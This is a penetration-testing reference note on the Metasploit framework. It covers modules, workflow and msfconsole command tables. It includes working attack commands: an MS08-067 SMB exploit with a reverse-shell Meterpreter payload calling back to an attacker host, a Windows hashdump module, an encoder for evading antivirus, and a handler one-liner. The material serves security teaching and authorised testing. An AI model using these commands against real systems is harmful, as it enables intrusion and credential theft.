# Index
- [[Command and Control Frameworks]]
	- [[Metasploit]]
		- [[Metasploit Multi Handler]]
		- [[Meterpreter]]
		- [[Msfvenom]]
		- [[Searchsploit]]

**[Metasploit Module Library](https://www.infosecmatter.com/metasploit-module-library/)**

# Summary
Metasploit is a free and open-source framework for developing and executing exploit code. It is widely used by security professionals and penetration testers for penetration testing, vulnerability scanning, and exploit development. It has a large collection of exploit modules and payloads that can be used to exploit known vulnerabilities in target systems. The framework also includes tools for post-exploitation activities, such as running system commands, gathering information, and creating a reverse shell.

Metasploit can run on Windows, Mac, and Linux, providing both a command-line interface (CLI) and a graphical interface (Msfconsole and Armitage GUI). It integrates with a database to store target information and test results, making data organization and analysis straightforward. Additionally, its active community continuously contributes new modules and payloads, ensuring it remains up-to-date with the latest vulnerabilities.

#### Key Features

- **Exploit Modules:** A vast library of exploits for various platforms and applications.
- **Payloads:** Customizable payloads for different attack vectors, such as reverse shells, bind shells, and Meterpreter.
- **Auxiliary Modules:** Tools for scanning, fingerprinting, and gathering information about target systems.
- **Post-Exploitation Modules:** Tools for maintaining access, gathering additional information, and pivoting within a network.
- **Encoders:** Tools for obfuscating payloads to avoid detection by security solutions.
- **NOP Generators:** Tools for generating no-operation (NOP) sleds to pad payloads.
- **User Interface Options:** Command-line interface (CLI), graphical user interface (GUI) via Armitage, and web-based interface via Metasploit Community Edition.

#### Typical Use Cases

- **Vulnerability Assessment:** Identifying and validating vulnerabilities in target systems.
- **Penetration Testing:** Exploiting vulnerabilities to gain unauthorized access.
- **Red Team Operations:** Simulating advanced persistent threats (APTs) and testing incident response capabilities.
- **Security Research:** Developing and testing new exploits and attack vectors.

# How Metasploit Works

1. **Setup and Configuration:**    
    - Install Metasploit on a compatible system.
    - Configure necessary settings such as database connection for logging and data storage.
2. **Target Discovery:**    
    - Use auxiliary modules to scan and identify potential targets.
    - Gather information about the target system, such as open ports, services, and operating systems.
3. **Vulnerability Identification:**    
    - Utilize auxiliary modules to identify vulnerabilities on the target system.
    - Cross-reference discovered vulnerabilities with available exploit modules in Metasploit.
4. **Exploit Selection:**    
    - Choose an appropriate exploit module based on the identified vulnerability.
    - Configure exploit parameters such as target IP, port, and payload.
5. **Payload Configuration:**    
    - Select and configure a payload that will be delivered upon successful exploitation.
    - Customize payload options such as IP addresses and ports for reverse connections.
6. **Exploitation:**    
    - Execute the exploit against the target system.
    - Monitor the exploitation process and troubleshoot any issues.
7. **Post-Exploitation:**    
    - Use post-exploitation modules to perform tasks such as privilege escalation, data exfiltration, and network pivoting.
    - Maintain access and cover tracks to avoid detection.
8. **Reporting and Analysis:**    
    - Collect and analyze data from the exploitation and post-exploitation phases.
    - Generate detailed reports for stakeholders, outlining findings, impact, and remediation recommendations.

# Metasploit Components

#### User Interfaces

- **CLI (Msfconsole):** Command-line interface for interacting with Metasploit.
- **GUI (Armitage):** Graphical user interface for visualizing and managing attacks.
- **Web Interface (Metasploit Community Edition):** Web-based interface for managing and automating penetration tests.

#### Msfconsole
Msfconsole is the primary CLI for interacting with Metasploit. It enables users to configure and launch exploit modules, payloads, and auxiliary modules. Msfconsole supports database integration, scripting, job control, and comprehensive output and logging options.

#### Modules
Metasploit modules are categorized into several types:

- **Exploits:** Exploits are modules that take advantage of vulnerabilities in target systems. They are categorized by the type of target system.

```
use exploit/windows/smb/ms08_067_netapi
set RHOST <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attack_ip>
set LPORT <attack_port>
exploit
```

- **Payloads:** Payloads are the code that runs on the target system once the exploit is successful. They can be self-contained or staged.

	- **Singles:** Standalone payloads that execute a specific action (e.g., adding a user).
	- **Stagers:** Set up a connection channel between Metasploit and the target.
	- **Stages:** Delivered by stagers, allowing for larger payloads.

```
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attack_ip>
set LPORT <attack_port>
```

- **Auxiliary:** Auxiliary modules include scanners, fuzzers, and other tools that assist in various penetration testing tasks.

```
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip_range>
set THREADS 10
run
```

- **Post:** Post-exploitation modules are used after a successful exploit to gather more information, escalate privileges, or maintain access.

```
use post/windows/gather/hashdump
set SESSION <session_id>
run
```

- **Encoders:** Encoders are used to encode payloads in an attempt to evade detection by security mechanisms.

```
use encoder/x86/shikata_ga_nai
set PAYLOAD windows/meterpreter/reverse_tcp
generate -f exe -o payload.exe
```

- **NOPs:** NOP (No Operation) modules create NOP sleds, which can help in buffer overflow exploits.

```
use payload/generic/shell_bind_tcp
set NOP 16
generate -f raw -o shellcode.bin
```

- **pattern_create and pattern_offset:** These tools are used to create and analyze patterns for identifying buffer overflow offsets.

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_value>
```

# Commands and Usage

#### Basic Commands 

Starting msfconsole

```
Attack:~$ msfconsole
```

Running msfconsole without Banner

```
msfconsole -q
```

Running msfconsole via one-liner

```
msfconsole -qx "use exploit/multi/handler; set PAYLOAD <payload>; set LHOST <attack_ip>; set LPORT <attack_port>; run"
```

#### Searching 

Searching for Exploits or Modules

```
search --help search <arg>
```

Specific Search

```
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

Showing All Modules

```
show exploits
show payloads
show auxiliary
```

Grep the Results of a Command

```
grep <arg> <msfconsole command>
grep windows show exploits
grep meterpreter grep reverse_tcp show payloads
```

Grep Options

```
-m, --max-count num      # Stop after num matches
-A, --after-context num  # Show num lines of output after a match
-B, --before-context num # Show num lines of output before a match
-C, --context num        # Show num lines of output around a match
-v, --invert-match       # Invert match
-i, --ignore-case        # Ignore case
-c, --count              # Only print a count of matching lines
-k, --keep-header num    # Keep num lines at start of output
-s, --skip-header num    # Skip num lines of output before attempting match
-h, --help               # Help banner
```

#### Core Commands

```
?                      # Help menu
banner                 # Display a Metasploit banner
cd <directory>         # Change the working directory
color                  # Toggle color
connect <host>         # Communicate with a host
debug                  # Display debugging information
exit                   # Exit the console
features               # Display unreleased features
get <variable>         # Get the value of a variable
getg <variable>        # Get the value of a global variable
grep <arg> <command>   # Grep the output of a command
help                   # Help menu
history                # Show command history
load <plugin>          # Load a plugin
quit                   # Exit the console
repeat <commands>      # Repeat commands
route                  # Route traffic through a session
save                   # Save the active datastores
sessions               # Manage sessions
set <variable> <value> # Set a variable to a value
setg <variable> <value># Set a global variable to a value
sleep <seconds>        # Sleep for a specified time
spool <file>           # Spool output to a file
threads                # Manage background threads
tips                   # Show productivity tips
unload <plugin>        # Unload a plugin
unset <variable>       # Unset a variable
unsetg <variable>      # Unset a global variable
version                # Show version numbers
```

#### Module Commands

```
info <#>               # Load information about a specific module
use <module>           # Load a module
show options           # Show module options
set <arg> <value>      # Set a specific value
setg <arg> <value>     # Set a global value
unset <arg>            # Unset a specific value
unsetg <arg>           # Unset a global value
check                  # Check if the target is vulnerable
exploit or run         # Execute the exploit or module
exploit -j             # Run the exploit as a job
exploit -z             # Do not interact with session after exploitation
exploit -e <encoder>   # Use a specific payload encoder
advanced               # Display advanced options
back                   # Move back from the current context
clearm                 # Clear the module stack
favorite <module>      # Add module to favorites
favorites              # Show favorite modules
listm                  # List the module stack
loadpath <path>        # Load modules from a path
popm                   # Pop a module from the stack
previous               # Load the previous module
pushm                  # Push a module onto the stack
reload_all             # Reload all modules
search <term>          # Search modules
```

#### Job Commands

```
handler                # Start a payload handler
jobs                   # Manage jobs
  -h                   # Help banner
  -i                   # List job information
  -k                   # Terminate jobs
  -K                   # Terminate all jobs
  -l                   # List running jobs
  -p                   # Add persistence to job
  -P                   # Persist all jobs on restart
  -S                   # Search jobs
  -v                   # Verbose job information
kill <job_id>          # Kill a job
rename_job <job>       # Rename a job
```

#### Resource Script Commands

```
makerc <file>          # Save commands to a file
resource <file>        # Run commands from a file
```

#### Database Backend Commands

```
analyze <address>      # Analyze database information
db_connect <service>   # Connect to a data service
db_disconnect          # Disconnect from data service
db_export <file>       # Export database contents
db_import <file>       # Import scan results
db_nmap <args>         # Execute nmap and record output
db_rebuild_cache       # Rebuild module cache
db_remove              # Remove data service entry
db_save                # Save data service connection
db_status              # Show data service status
hosts                  # List all hosts
klist                  # List Kerberos tickets
loot                   # List all loot
notes                  # List all notes
services               # List all services
vulns                  # List all vulnerabilities
workspace <name>       # Switch workspaces
```

#### Credentials Backend Commands

```
creds                  # List all credentials
```

#### Developer Commands

```
edit                   # Edit the current module
irb                    # Open a Ruby shell
log                    # Display framework log
pry                    # Open the Pry debugger
reload_lib <paths>     # Reload Ruby libraries
time <command>         # Time a command
```

#### Exploit Commands

```
check                  # Check if the target is vulnerable
exploit                # Launch an exploit attempt
  -J                   # Force running in foreground
  -e <encoder>         # Specify payload encoder
  -f                   # Force exploit run
  -h                   # Help banner
  -j                   # Run as a job
rcheck                 # Reload and check vulnerability
recheck                # Alias for rcheck
reload                 # Reload the module
rerun                  # Alias for rexploit
rexploit               # Reload and exploit
run                    # Alias for exploit
```

# Additional Information

#### File Structure

- **Modules Directory:** `/usr/share/metasploit-framework/modules/`
- **Payloads Directory:** `/usr/share/metasploit-framework/modules/payloads/`
- **Encoders Directory:** `/usr/share/metasploit-framework/modules/encoders/`

Typical syntax is `<type>/<os>/<service>/<name>`.

```
794   exploit/windows/ftp/scriptftp_list
```

#### Adding New Exploits

1. Pull the exploit from Exploit-db or another source (usually a .rb or .py file).
2. Add the file to the appropriate directory under `/usr/share/metasploit-framework/modules/`.
3. Load `msfconsole`.
4. Search for the exploit by its filename.

#### Metasploit Plugins
Plugins extend Metasploit's functionality. To install and load plugins:

List Installed Plugins

```
ls /usr/share/metasploit-framework/plugins
```

Load Plugin

```
load nessus
```

Install New Plugins

```
git clone <plugin_url> cp <plugin_name> /usr/share/metasploit-framework/plugins
```

#### Piping Exploits Through Existing Sessions

1. Run initial exploit.
2. Background the session (`ctrl+z`).
3. Identify the session number (`sessions -l`).
4. Use a new exploit.
5. Set the `SESSION` option to the previous session ID.
6. Exploit.

#### Local Exploit Suggester
The Local Exploit Suggester helps identify additional exploit possibilities on an established session.

```
search local exploit suggester
```

#### Virus Total Integration
Metasploit offers a tool called msf-virustotal that uses an API key to analyze payloads. Registration on Virus Total is required.

```
msf-virustotal -k <API key> -f <payload.exe>
```

#### Advanced Options

- **Database Integration:** Supports PostgreSQL for logging and data storage.
- **Custom Module Development:** Users can develop and integrate custom modules.

#### Secondary Functions

- **API Access:** Metasploit offers API access for automation and integration with other tools.
- **Community Contributions:** An active community that regularly contributes new modules and updates.

#### Circumstantial Information

- **Operating System Compatibility:** Metasploit is compatible with multiple operating systems, including Linux, Windows, and macOS.
- **Integration with Other Tools:** Metasploit can be integrated with other tools such as Nmap, Nessus, and Burp Suite for enhanced capabilities.

# Resources

|**Website**|**URL**|
|-|-|
|Metasploit Framework|[https://www.metasploit.com](https://www.metasploit.com)|
|Metasploit Resource Portal|http://resources.metasploit.com/ |
|Metasploit Unleashed|https://www.offensive-security.com/metasploit-unleashed/|
|Rapid7 Metasploit Documentation|https://docs.rapid7.com/metasploit/|
|Exploit Database|[https://www.exploit-db.com](https://www.exploit-db.com)|
|Metasploit GitHub Repository|[https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)|
|GitHub - PayloadAllTheThings|https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md |
|Metasploitable 2 Exploitability Guide|https://community.rapid7.com/docs/DOC-1875 |
|Metasploitable 2 Walkthrough|https://tehaurum.wordpress.com/2015/06/14/metasploitable-2-walkthrough-an-exploitation-guide/ |
|Rapid7 - Metasploit Guide|https://docs.rapid7.com/metasploit/quick-start-guide |
|TutorialsPoint - Metasploit|https://www.tutorialspoint.com/metasploit/metasploit_basic_commands.htm |
|InfosecMatter - Metasploit Module Library|https://www.infosecmatter.com/metasploit-module-library/ |